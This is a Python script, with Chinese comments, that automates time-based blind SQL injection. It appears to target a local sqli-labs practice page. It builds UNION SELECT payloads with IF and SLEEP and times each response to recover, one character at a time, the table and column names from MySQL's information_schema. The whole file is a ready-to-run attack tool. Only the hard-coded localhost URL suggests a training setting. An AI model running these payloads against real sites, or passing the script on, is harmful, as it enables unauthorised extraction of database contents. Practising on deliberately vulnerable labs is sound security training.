#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
 * @Author whale4u
 * @Date 2021/5/6
 * @Version 1.0
"""

import string
import datetime
import requests

# mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举
chr_str = string.ascii_lowercase + string.punctuation + string.digits

# payload
payload_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
payload_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database())"

# payload_len
payload_len = "' union select if(length({0})={1},sleep(2), 1),2,3 --+"
# payload_name
payload_name = "' union select if(substr({0},{1},1)='{2}',sleep(2), 1),2,3 --+"

# url
url = "http://127.0.0.1:8081/Less-1/?id=1"

class SQLInjector:
    def __init__(self, url, payload):
        self.url = url
        self.payload = payload
    def get_length(self):
        i = 1
        while True:
            # print(i)
            full_url = (self.url + payload_len).format(self.payload, i)
            time1 = datetime.datetime.now()
            req = requests.get(full_url)
            time2 = datetime.datetime.now()
            elapse = (time2-time1).seconds
            # sleep时间为1可能存在误报
            if elapse > 1:
                print("len: ", i)
                return i
            i += 1
    def get_name(self):
        length = self.get_length()
        output = ""
        for i in range(1, length+1):
            for j in chr_str:
                # print(j)
                full_url = (self.url + payload_name).format(self.payload, i, j)
                time1 = datetime.datetime.now()
                req = requests.get(full_url)
                time2 = datetime.datetime.now()
                elapse = (time2-time1).seconds
                # sleep时间为1可能存在误报
                if elapse > 1:
                    output += j
                    print(output)
                    # 跳过当前循环，继续遍历下一位
                    break

if __name__ == "__main__":
    sqli = SQLInjector(url, payload_c)
    # sqli.get_length()
    sqli.get_name()